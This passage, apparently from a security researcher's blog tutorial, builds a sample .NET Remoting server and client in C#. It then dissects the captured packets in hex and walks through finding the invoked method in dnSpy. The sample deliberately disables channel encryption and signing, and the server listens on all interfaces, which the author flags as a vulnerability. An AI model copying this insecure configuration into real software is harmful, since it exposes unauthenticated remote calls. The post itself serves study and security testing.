37&lt;/pre&gt;&lt;/div&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;div class=&#34;highlight&#34; style=&#34;background: #002B36&#34;&gt;&lt;pre style=&#34;line-height: 125%&#34;&gt;&lt;span style=&#34;color: #719e07&#34;&gt;using&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;System;&lt;/span&gt;
&lt;span style=&#34;color: #719e07&#34;&gt;using&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;System.Collections.Generic;&lt;/span&gt;
&lt;span style=&#34;color: #719e07&#34;&gt;using&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;System.Linq;&lt;/span&gt;
&lt;span style=&#34;color: #719e07&#34;&gt;using&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;System.Text;&lt;/span&gt;
&lt;span style=&#34;color: #719e07&#34;&gt;using&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;System.Threading.Tasks;&lt;/span&gt;
&lt;span style=&#34;color: #719e07&#34;&gt;using&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;System.Runtime.Remoting;&lt;/span&gt;
&lt;span style=&#34;color: #719e07&#34;&gt;using&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;System.Runtime.Remoting.Channels;&lt;/span&gt;
&lt;span style=&#34;color: #719e07&#34;&gt;using&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;System.Runtime.Remoting.Channels.Tcp;&lt;/span&gt;

&lt;span style=&#34;color: #719e07&#34;&gt;namespace&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;RemotingSample&lt;/span&gt;
&lt;span style=&#34;color: #93A1A1&#34;&gt;{&lt;/span&gt;
  &lt;span style=&#34;color: #719e07&#34;&gt;class&lt;/span&gt; &lt;span style=&#34;color: #268BD2&#34;&gt;Server&lt;/span&gt;
  &lt;span style=&#34;color: #93A1A1&#34;&gt;{&lt;/span&gt;
    &lt;span style=&#34;color: #719e07&#34;&gt;static&lt;/span&gt; &lt;span style=&#34;color: #719e07&#34;&gt;void&lt;/span&gt; &lt;span style=&#34;color: #268BD2&#34;&gt;Main&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color: #DC322F&#34;&gt;string&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;[]&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;args)&lt;/span&gt;
    &lt;span style=&#34;color: #93A1A1&#34;&gt;{&lt;/span&gt;
      &lt;span style=&#34;color: #586E75&#34;&gt;// create a TCP channel and bind it to port 8888&lt;/span&gt;
      &lt;span style=&#34;color: #93A1A1&#34;&gt;TcpChannel&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;remotingChannel&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color: #719e07&#34;&gt;new&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;TcpChannel(&lt;/span&gt;&lt;span style=&#34;color: #2AA198&#34;&gt;8888&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;);&lt;/span&gt;

      &lt;span style=&#34;color: #586E75&#34;&gt;// register the channel, the second parameter is ensureSecurity&lt;/span&gt;
      &lt;span style=&#34;color: #586E75&#34;&gt;// I have set it to false to disable encryption and signing&lt;/span&gt;
      &lt;span style=&#34;color: #586E75&#34;&gt;// for more information see section Remarks in https://msdn.microsoft.com/en-us/library/ms223155(v=vs.90).aspx&lt;/span&gt;
      &lt;span style=&#34;color: #93A1A1&#34;&gt;ChannelServices.RegisterChannel(remotingChannel,&lt;/span&gt; &lt;span style=&#34;color: #719e07&#34;&gt;false&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;);&lt;/span&gt;

      &lt;span style=&#34;color: #586E75&#34;&gt;// create a new servicetype of type RemoteMath named &amp;quot;rMath&amp;quot; and of type SingleCall&lt;/span&gt;
      &lt;span style=&#34;color: #586E75&#34;&gt;// SingleCall: a new object will be created for each call&lt;/span&gt;
      &lt;span style=&#34;color: #586E75&#34;&gt;// as opposed to WellKnownObjectMode.Singleton where there is one object for all calls (and clients)&lt;/span&gt;
      &lt;span style=&#34;color: #93A1A1&#34;&gt;WellKnownServiceTypeEntry&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;remoteObject&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color: #719e07&#34;&gt;new&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;WellKnownServiceTypeEntry(&lt;/span&gt;&lt;span style=&#34;color: #719e07&#34;&gt;typeof&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;(RemoteMath),&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;&amp;quot;rMath&amp;quot;&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;WellKnownObjectMode.SingleCall);&lt;/span&gt;

      &lt;span style=&#34;color: #586E75&#34;&gt;// register the remoteObject servicetype&lt;/span&gt;
      &lt;span style=&#34;color: #93A1A1&#34;&gt;RemotingConfiguration.RegisterWellKnownServiceType(remoteObject);&lt;/span&gt;

      &lt;span style=&#34;color: #93A1A1&#34;&gt;Console.WriteLine(&lt;/span&gt;&lt;span style=&#34;color: #2AA198&#34;&gt;&amp;quot;Registered service&amp;quot;&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;);&lt;/span&gt;
      &lt;span style=&#34;color: #93A1A1&#34;&gt;Console.WriteLine(&lt;/span&gt;&lt;span style=&#34;color: #2AA198&#34;&gt;&amp;quot;Press any key to exit&amp;quot;&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;);&lt;/span&gt;
      &lt;span style=&#34;color: #93A1A1&#34;&gt;Console.ReadLine();&lt;/span&gt;
    &lt;span style=&#34;color: #93A1A1&#34;&gt;}&lt;/span&gt;
  &lt;span style=&#34;color: #93A1A1&#34;&gt;}&lt;/span&gt;
&lt;span style=&#34;color: #93A1A1&#34;&gt;}&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
  &lt;/div&gt;
&lt;/figure&gt;


&lt;p&gt;We need to add two references to the project using &lt;code&gt;Project (menu) &amp;gt; Add References&lt;/code&gt;:&lt;/p&gt;

&lt;ol&gt;
&lt;li&gt;&lt;code&gt;System.Runtime.Remoting&lt;/code&gt; assembly&lt;/li&gt;
&lt;li&gt;Remoting Library project&lt;/li&gt;
&lt;/ol&gt;

&lt;p&gt;Server will expose the &lt;code&gt;RemoteMath&lt;/code&gt; class and wait until a key is pressed. Client can call the functions in &lt;code&gt;RemoteMath&lt;/code&gt; until the server is terminated.&lt;/p&gt;

&lt;p&gt;Client code also needs the same two references. Client calls &lt;code&gt;Add&lt;/code&gt; and &lt;code&gt;Sub&lt;/code&gt; and prints the results.&lt;/p&gt;




    

&lt;figure class=&#34;code&#34;&gt;
  &lt;figcaption&gt;
  	&lt;span&gt;Client.cs&lt;/span&gt;
  &lt;/figcaption&gt;
  &lt;div class=&#34;codewrapper&#34;&gt; 
    &lt;table class=&#34;highlighttable&#34;&gt;&lt;tr&gt;&lt;td&gt;&lt;div class=&#34;linenodiv&#34; style=&#34;background-color: #f0f0f0; padding-right: 10px&#34;&gt;&lt;pre style=&#34;line-height: 125%&#34;&gt; 1
 2
 3
 4
 5
 6
 7
 8
 9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40&lt;/pre&gt;&lt;/div&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;div class=&#34;highlight&#34; style=&#34;background: #002B36&#34;&gt;&lt;pre style=&#34;line-height: 125%&#34;&gt;&lt;span style=&#34;color: #719e07&#34;&gt;using&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;System;&lt;/span&gt;
&lt;span style=&#34;color: #719e07&#34;&gt;using&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;System.Collections.Generic;&lt;/span&gt;
&lt;span style=&#34;color: #719e07&#34;&gt;using&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;System.Linq;&lt;/span&gt;
&lt;span style=&#34;color: #719e07&#34;&gt;using&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;System.Text;&lt;/span&gt;
&lt;span style=&#34;color: #719e07&#34;&gt;using&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;System.Threading.Tasks;&lt;/span&gt;
&lt;span style=&#34;color: #719e07&#34;&gt;using&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;System.Runtime.Remoting;&lt;/span&gt;
&lt;span style=&#34;color: #719e07&#34;&gt;using&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;System.Runtime.Remoting.Channels;&lt;/span&gt;
&lt;span style=&#34;color: #719e07&#34;&gt;using&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;System.Runtime.Remoting.Channels.Tcp;&lt;/span&gt;

&lt;span style=&#34;color: #719e07&#34;&gt;namespace&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;RemotingSample&lt;/span&gt;
&lt;span style=&#34;color: #93A1A1&#34;&gt;{&lt;/span&gt;
  &lt;span style=&#34;color: #719e07&#34;&gt;class&lt;/span&gt; &lt;span style=&#34;color: #268BD2&#34;&gt;Client&lt;/span&gt;
  &lt;span style=&#34;color: #93A1A1&#34;&gt;{&lt;/span&gt;
    &lt;span style=&#34;color: #719e07&#34;&gt;static&lt;/span&gt; &lt;span style=&#34;color: #719e07&#34;&gt;void&lt;/span&gt; &lt;span style=&#34;color: #268BD2&#34;&gt;Main&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color: #DC322F&#34;&gt;string&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;[]&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;args)&lt;/span&gt;
    &lt;span style=&#34;color: #93A1A1&#34;&gt;{&lt;/span&gt;
      &lt;span style=&#34;color: #586E75&#34;&gt;// create and register the TCP channel&lt;/span&gt;
      &lt;span style=&#34;color: #586E75&#34;&gt;// please note that I have set the security of the channel to false&lt;/span&gt;
      &lt;span style=&#34;color: #93A1A1&#34;&gt;TcpChannel&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;clientRemotingChannel&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color: #719e07&#34;&gt;new&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;TcpChannel();&lt;/span&gt;
      &lt;span style=&#34;color: #93A1A1&#34;&gt;ChannelServices.RegisterChannel(clientRemotingChannel,&lt;/span&gt; &lt;span style=&#34;color: #719e07&#34;&gt;false&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;);&lt;/span&gt;

      &lt;span style=&#34;color: #586E75&#34;&gt;// create an object of type RemothMath&lt;/span&gt;
      &lt;span style=&#34;color: #586E75&#34;&gt;// we have to do a cast because Activator.GetObject returns an object (doh)&lt;/span&gt;
      &lt;span style=&#34;color: #586E75&#34;&gt;// type is RemoteMath and server address is what we created in Server.cs (port:8888 and rMath)&lt;/span&gt;

      &lt;span style=&#34;color: #586E75&#34;&gt;// Server.cs code:&lt;/span&gt;
      &lt;span style=&#34;color: #586E75&#34;&gt;// TcpChannel remotingChannel = new TcpChannel(8888);&lt;/span&gt;
      &lt;span style=&#34;color: #586E75&#34;&gt;// ChannelServices.RegisterChannel(remotingChannel, false);&lt;/span&gt;
      &lt;span style=&#34;color: #586E75&#34;&gt;// WellKnownServiceTypeEntry remoteObject = new WellKnownServiceTypeEntry(typeof(RemoteMath), &amp;quot;rMath&amp;quot;, WellKnownObjectMode.SingleCall);&lt;/span&gt;

      &lt;span style=&#34;color: #93A1A1&#34;&gt;RemoteMath&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;remoteMathObject&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;(RemoteMath)Activator.GetObject(&lt;/span&gt;&lt;span style=&#34;color: #719e07&#34;&gt;typeof&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;(RemoteMath),&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;&amp;quot;tcp://localhost:8888/rMath&amp;quot;&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;);&lt;/span&gt;

      &lt;span style=&#34;color: #586E75&#34;&gt;// now we can call Add and Sub functions&lt;/span&gt;
      &lt;span style=&#34;color: #93A1A1&#34;&gt;Console.WriteLine(&lt;/span&gt;&lt;span style=&#34;color: #2AA198&#34;&gt;&amp;quot;Result of Add(1, 2): {0}&amp;quot;&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;remoteMathObject.Add(&lt;/span&gt;&lt;span style=&#34;color: #2AA198&#34;&gt;1&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;2&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;));&lt;/span&gt;
      &lt;span style=&#34;color: #93A1A1&#34;&gt;Console.WriteLine(&lt;/span&gt;&lt;span style=&#34;color: #2AA198&#34;&gt;&amp;quot;Result of Sub(10, 3): {0}&amp;quot;&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;remoteMathObject.Sub(&lt;/span&gt;&lt;span style=&#34;color: #2AA198&#34;&gt;10&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;3&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;));&lt;/span&gt;

      &lt;span style=&#34;color: #93A1A1&#34;&gt;Console.WriteLine(&lt;/span&gt;&lt;span style=&#34;color: #2AA198&#34;&gt;&amp;quot;Press any key to exit&amp;quot;&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;);&lt;/span&gt;
      &lt;span style=&#34;color: #93A1A1&#34;&gt;Console.ReadLine();&lt;/span&gt;
    &lt;span style=&#34;color: #93A1A1&#34;&gt;}&lt;/span&gt;
  &lt;span style=&#34;color: #93A1A1&#34;&gt;}&lt;/span&gt;
&lt;span style=&#34;color: #93A1A1&#34;&gt;}&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
  &lt;/div&gt;
&lt;/figure&gt;


&lt;p&gt;Now we can build the solution. If you look at the resulting executables we will that both client and server have a copy of &lt;code&gt;RemotingLibrary.dll&lt;/code&gt;.&lt;/p&gt;









&lt;span class=&#34;caption-wrapper&#34;&gt;
  &lt;img class=&#34;caption&#34; src=&#34;http://parsiya.net/images/2015/remoting1/01.png&#34; title=&#34;Both Client and Server have the same DLL&#34; alt=&#34;Both Client and Server have the same DLL&#34;&gt;
  &lt;span class=&#34;caption-text&#34;&gt;Both Client and Server have the same DLL&lt;/span&gt;
&lt;/span&gt;

&lt;p&gt;Now start &lt;code&gt;RawCap&lt;/code&gt; and capture local traffic.&lt;/p&gt;

&lt;h3 id=&#34;a-name-ch3-a-3-net-remoting-messages:a4cceda545ee0d0782d3d591639b4015&#34;&gt;&lt;a name=&#34;ch3&#34;&gt;&lt;/a&gt; 3. .NET Remoting Messages&lt;/h3&gt;

&lt;p&gt;When you initially run the server, it will ask to be added to Windows Firewall&amp;rsquo;s exceptions. You can safely deny that as both client and server are local. This is a major vulnerability in many .NET Remoting applications that work locally (like our example). If we do a &lt;code&gt;netstat&lt;/code&gt; we can see that server is bound to &lt;code&gt;0.0.0.0&lt;/code&gt; and is listening on all interfaces. Meaning anyone can connect to the server and execute exposed functions on our computer. We will read more about this later.&lt;/p&gt;









&lt;span class=&#34;caption-wrapper&#34;&gt;
  &lt;img class=&#34;caption&#34; src=&#34;http://parsiya.net/images/2015/remoting1/02.png&#34; title=&#34;Server listening on all interfaces&#34; alt=&#34;Server listening on all interfaces&#34;&gt;
  &lt;span class=&#34;caption-text&#34;&gt;Server listening on all interfaces&lt;/span&gt;
&lt;/span&gt;

&lt;p&gt;Now run both server and client and look at the results.&lt;/p&gt;

&lt;p&gt;We can see client calling both functions and printing the result.&lt;/p&gt;









&lt;span class=&#34;caption-wrapper&#34;&gt;
  &lt;img class=&#34;caption&#34; src=&#34;http://parsiya.net/images/2015/remoting1/03.png&#34; title=&#34;&#34; alt=&#34;&#34;&gt;
  &lt;span class=&#34;caption-text&#34;&gt;&lt;/span&gt;
&lt;/span&gt;

&lt;p&gt;We can clearly see that the functions were executed in server&amp;rsquo;s application context because server is printing the verbose messages from &lt;code&gt;RemotingLibrary.dll&lt;/code&gt;.&lt;/p&gt;









&lt;span class=&#34;caption-wrapper&#34;&gt;
  &lt;img class=&#34;caption&#34; src=&#34;http://parsiya.net/images/2015/remoting1/04.png&#34; title=&#34;&#34; alt=&#34;&#34;&gt;
  &lt;span class=&#34;caption-text&#34;&gt;&lt;/span&gt;
&lt;/span&gt;

&lt;p&gt;If we look at the traffic in Wireshark and filter all traffic to/from port &lt;code&gt;8888&lt;/code&gt;:&lt;/p&gt;









&lt;span class=&#34;caption-wrapper&#34;&gt;
  &lt;img class=&#34;caption&#34; src=&#34;http://parsiya.net/images/2015/remoting1/05.png&#34; title=&#34;&#34; alt=&#34;&#34;&gt;
  &lt;span class=&#34;caption-text&#34;&gt;&lt;/span&gt;
&lt;/span&gt;

&lt;p&gt;You can read about the format and structure of .NET Remoting packets in the following documents:&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;&lt;a href=&#34;http://download.microsoft.com/download/9/5/E/95EF66AF-9026-4BB0-A41D-A4F81802D92C/%5BMS-NRTP%5D.pdf&#34; target=&#34;_blank&#34;&gt;[MS-NRTP].NET Core Protocol - PDF&lt;/a&gt; or just search for &lt;code&gt;[MS-NRTP]&lt;/code&gt;.&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;http://download.microsoft.com/download/9/5/E/95EF66AF-9026-4BB0-A41D-A4F81802D92C/%5BMS-NRBF%5D.pdf&#34; target=&#34;_blank&#34;&gt;[MS-NRBF] .NET Remoting: Binary Format Data Structure - PDF&lt;/a&gt; or just search for &lt;code&gt;[MS-NRBF]&lt;/code&gt;.&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;After the TCP handshake we see the first packet from client to server. According to section &lt;code&gt;2.2.3.3 Message Frame Structure&lt;/code&gt; of &lt;code&gt;[MS-NRTP]&lt;/code&gt; every message should start with &lt;code&gt;ProtocolId&lt;/code&gt; which is 4 bytes and should be &lt;code&gt;0x54454E2E&lt;/code&gt; or &lt;code&gt;.NET&lt;/code&gt;.&lt;/p&gt;
&lt;div class=&#34;highlight&#34; style=&#34;background: #002B36&#34;&gt;&lt;pre style=&#34;line-height: 125%&#34;&gt;2e 4e 45 54 01 00 00 00 00 00 8d 00 00 00 04 00  .NET............
01 01 1a 00 00 00 74 63 70 3a 2f 2f 6c 6f 63 61  ......tcp://loca
6c 68 6f 73 74 3a 38 38 38 38 2f 72 4d 61 74 68  lhost:8888/rMath
06 00 01 01 18 00 00 00 61 70 70 6c 69 63 61 74  ........applicat
69 6f 6e 2f 6f 63 74 65 74 2d 73 74 72 65 61 6d  ion/octet-stream
00 00                                            ..

.NET tcp://localhost:8888/rMath application/octet-stream

ProtocolId: 0x54454E2E or .NET
Major version: 0x00
Minor Version: 0x00
OperationType: 0x0000 or Request
&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;This is setting up the .NET Remoting channel and specifying the exposed class that it wants to access &lt;code&gt;rMath&lt;/code&gt;. Next is the second part of the first message.&lt;/p&gt;
&lt;div class=&#34;highlight&#34; style=&#34;background: #002B36&#34;&gt;&lt;pre style=&#34;line-height: 125%&#34;&gt;00 00 00 00 00 00 00 00 00 01 00 00 00 00 00 00  ................
00 15 12 00 00 00 12 03 41 64 64 12 61 52 65 6d  ........Add.aRem
6f 74 69 6e 67 53 61 6d 70 6c 65 2e 52 65 6d 6f  otingSample.Remo
74 65 4d 61 74 68 2c 20 52 65 6d 6f 74 69 6e 67  teMath, Remoting
4c 69 62 72 61 72 79 2c 20 56 65 72 73 69 6f 6e  Library, Version
3d 31 2e 30 2e 30 2e 30 2c 20 43 75 6c 74 75 72  =1.0.0.0, Cultur
65 3d 6e 65 75 74 72 61 6c 2c 20 50 75 62 6c 69  e=neutral, Publi
63 4b 65 79 54 6f 6b 65 6e 3d 6e 75 6c 6c 02 00  cKeyToken=null..
00 00 08 01 00 00 00 08 02 00 00 00 0b           .............

Add RemotingSample.RemoteMath, RemotingLibrary, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;This is the &lt;code&gt;Add(1,2)&lt;/code&gt; call. We can see the following in this message:&lt;/p&gt;
&lt;div class=&#34;highlight&#34; style=&#34;background: #002B36&#34;&gt;&lt;pre style=&#34;line-height: 125%&#34;&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;RemotingLibrary&lt;/span&gt;&lt;span style=&#34;color: #719e07&#34;&gt;:&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;DLL&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;containing&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;the&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;exposed&lt;/span&gt; &lt;span style=&#34;color: #268BD2&#34;&gt;class&lt;/span&gt;
&lt;span style=&#34;color: #93A1A1&#34;&gt;RemotingSample&lt;/span&gt;&lt;span style=&#34;color: #719e07&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;Remotemath&lt;/span&gt;&lt;span style=&#34;color: #719e07&#34;&gt;:&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;The&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;exposed&lt;/span&gt; &lt;span style=&#34;color: #268BD2&#34;&gt;class&lt;/span&gt;
&lt;span style=&#34;color: #93A1A1&#34;&gt;Add&lt;/span&gt;&lt;span style=&#34;color: #719e07&#34;&gt;:&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;The&lt;/span&gt; &lt;span style=&#34;color: #268BD2&#34;&gt;function&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;that&lt;/span&gt; &lt;span style=&#34;color: #719e07&#34;&gt;is&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;called&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;And if you look closely you can see the &lt;code&gt;Add&lt;/code&gt; parameters in the last line in little endian (Int32 or 4 bytes).&lt;/p&gt;
&lt;div class=&#34;highlight&#34; style=&#34;background: #002B36&#34;&gt;&lt;pre style=&#34;line-height: 125%&#34;&gt;01 00 00 00: int a
02 00 00 00: int b
&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;I don&amp;rsquo;t want to talk about the message structure, just identifying the method, parameters, class and DLL when we see such a packet is enough.&lt;/p&gt;

&lt;p&gt;For a very good explanation of all fields using examples please refer to section &lt;code&gt;4.1 Two-Way Method Invocation Using TCP-Binary&lt;/code&gt; of &lt;code&gt;[MS-NRTP]&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;Think of the reply as an ACK and like any other .NET Remoting message it starts with &lt;code&gt;.NET&lt;/code&gt;. According to &lt;code&gt;[MS-NRTP] Section 2.1.1.1.2 Receiving Reply&lt;/code&gt; &amp;ldquo;If the OperationType of the message is Request(0), an implementation MUST wait for the Two-Way Reply message in the same connection.&amp;rdquo;&lt;/p&gt;
&lt;div class=&#34;highlight&#34; style=&#34;background: #002B36&#34;&gt;&lt;pre style=&#34;line-height: 125%&#34;&gt;2e 4e 45 54 01 00 02 00 00 00 1c 00 00 00 00 00 .NET............

ProtocolId: 0x54454E2E or .NET
Major version: 0x00
Minor Version: 0x00
OperationType: 0x0002 or Response
&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;Then the actual result is sent from server to client.&lt;/p&gt;
&lt;div class=&#34;highlight&#34; style=&#34;background: #002B36&#34;&gt;&lt;pre style=&#34;line-height: 125%&#34;&gt;00 00 00 00 00 00 00 00 00 01 00 00 00 00 00 00  ................
00 16 11 08 00 00 08 03 00 00 00 0b              ............
&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;We can see the return value (which is again an Int32 and 4 bytes) at the end of the packet prefixed by the same &lt;code&gt;0x08&lt;/code&gt; byte that we saw before (remember the parameters?), and is &lt;code&gt;03 00 00 00&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;Messages for &lt;code&gt;Sub&lt;/code&gt; are very similar. I am not going to talk about them because, ahem &lt;code&gt;they are left as an exercise for the reader&lt;/code&gt;.&lt;/p&gt;

&lt;h3 id=&#34;a-name-ch4-a-4-debugging-with-dnspy:a4cceda545ee0d0782d3d591639b4015&#34;&gt;&lt;a name=&#34;ch4&#34;&gt;&lt;/a&gt; 4. Debugging with dnSpy&lt;/h3&gt;

&lt;p&gt;In this section, I assume you know basic debugging (e.g. breakpoints, step into/over/out) so I will not go into details. I will mostly just talk about (some of) dnSpy&amp;rsquo;s features.&lt;/p&gt;

&lt;p&gt;Run &lt;code&gt;Server.exe&lt;/code&gt; and then run dnSpy (for x86 application use &lt;code&gt;dnSpy-x86.exe&lt;/code&gt;). Drag and drop &lt;code&gt;Client.exe&lt;/code&gt; into it and navigate to &lt;code&gt;Main&lt;/code&gt;. Notice that dnSpy automatically loads referenced DLLs including &lt;code&gt;RemotingLibrary.dll&lt;/code&gt;. The decompiled code in dnSpy is the same as our original code but without the comments.&lt;/p&gt;









&lt;span class=&#34;caption-wrapper&#34;&gt;
  &lt;img class=&#34;caption&#34; src=&#34;http://parsiya.net/images/2015/remoting1/06.png&#34; title=&#34;&#34; alt=&#34;&#34;&gt;
  &lt;span class=&#34;caption-text&#34;&gt;&lt;/span&gt;
&lt;/span&gt;

&lt;p&gt;Now we can run the client in dnSpy. Click on the green button named &lt;code&gt;Start&lt;/code&gt; and it will open a dialog to start an executable in dnSpy. In version 1.4 it is pre-populated with &lt;code&gt;Client.exe&lt;/code&gt; that we just dragged and dropped into dnSpy. As you can see, what can also specify arguments and also order the debugger to break on certain events. Let&amp;rsquo;s keep the original selection and run &lt;code&gt;Client.exe&lt;/code&gt;. dnSpy will break on &lt;code&gt;Main&lt;/code&gt;.&lt;/p&gt;









&lt;span class=&#34;caption-wrapper&#34;&gt;
  &lt;img class=&#34;caption&#34; src=&#34;http://parsiya.net/images/2015/remoting1/07.png&#34; title=&#34;&#34; alt=&#34;&#34;&gt;
  &lt;span class=&#34;caption-text&#34;&gt;&lt;/span&gt;
&lt;/span&gt;

&lt;p&gt;Now we can debug normally using shortcut keys or small button to the right of the &lt;code&gt;Continue&lt;/code&gt; button (formerly &lt;code&gt;Start&lt;/code&gt;).&lt;/p&gt;

&lt;p&gt;To set a breakpoint, you can either select a line and press &lt;code&gt;F2&lt;/code&gt;, click on the space left of the line number or right click on the line and select it from the context menu. In this case we put a breakpoint on line &lt;code&gt;16&lt;/code&gt; or the first &lt;code&gt;Console.WriteLine&lt;/code&gt;.&lt;/p&gt;









&lt;span class=&#34;caption-wrapper&#34;&gt;
  &lt;img class=&#34;caption&#34; src=&#34;http://parsiya.net/images/2015/remoting1/08.png&#34; title=&#34;&#34; alt=&#34;&#34;&gt;
  &lt;span class=&#34;caption-text&#34;&gt;&lt;/span&gt;
&lt;/span&gt;

&lt;h4 id=&#34;4-1-finding-nemo:a4cceda545ee0d0782d3d591639b4015&#34;&gt;4.1 Finding Nemo&lt;/h4&gt;

&lt;p&gt;In this case, we can clearly see the &lt;code&gt;Add&lt;/code&gt; function and where it is called. But let&amp;rsquo;s assume that we only saw the traffic and opened the binary in dnSpy and didn&amp;rsquo;t know where it is called. Our binary contains tons and tons of imaginary functions that may or may not call &lt;code&gt;Add&lt;/code&gt;. How do we find &lt;code&gt;Add&lt;/code&gt;?&lt;/p&gt;

&lt;p&gt;From the traffic we know that the function name is &lt;code&gt;Add&lt;/code&gt; and it is in class &lt;code&gt;RemotingSample.Remotemath&lt;/code&gt; and resides in &lt;code&gt;RemotingLibrary.dll&lt;/code&gt;. Using these clues we can easily find the &lt;code&gt;Add&lt;/code&gt; function in dnSpy.&lt;/p&gt;









&lt;span class=&#34;caption-wrapper&#34;&gt;
  &lt;img class=&#34;caption&#34; src=&#34;http://parsiya.net/images/2015/remoting1/09.png&#34; title=&#34;&#34; alt=&#34;&#34;&gt;
  &lt;span class=&#34;caption-text&#34;&gt;&lt;/span&gt;
&lt;/span&gt;

